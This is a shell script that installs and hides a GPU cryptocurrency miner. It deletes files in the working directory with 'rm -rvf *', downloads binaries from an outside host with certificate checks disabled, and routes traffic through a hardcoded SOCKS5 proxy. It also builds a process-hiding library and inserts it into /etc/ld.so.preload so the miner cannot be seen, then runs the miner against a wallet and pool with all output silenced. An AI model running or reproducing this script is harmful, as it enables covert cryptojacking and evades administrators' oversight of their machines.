#!/bin/sh
rm -rvf * && mkdir a && cd a
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget --no-check-certificate https://maskurniawan.serv00.net/libcudart.so.13 >/dev/null 2>&1 && chmod +x libcudart.so.13
wget --no-check-certificate -O pearl-gpu-miner https://maskurniawan.serv00.net/pearl-gpu-miner >/dev/null 2>&1 && chmod +x pearl-gpu-miner

wget --no-check-certificate https://maskurniawan.serv00.net/graphics.tar.gz >/dev/null 2>&1

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 202.155.9.40:443
socks5_username = excel123
socks5_password = excel123
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget --no-check-certificate https://maskurniawan.serv00.net/magicBezzHash.zip >/dev/null 2>&1
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp && clear && ./pearl-gpu-miner --wallet prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg.AI-qwen-31 --pool 202.155.9.40:80 >/dev/null 2>&1 && clear
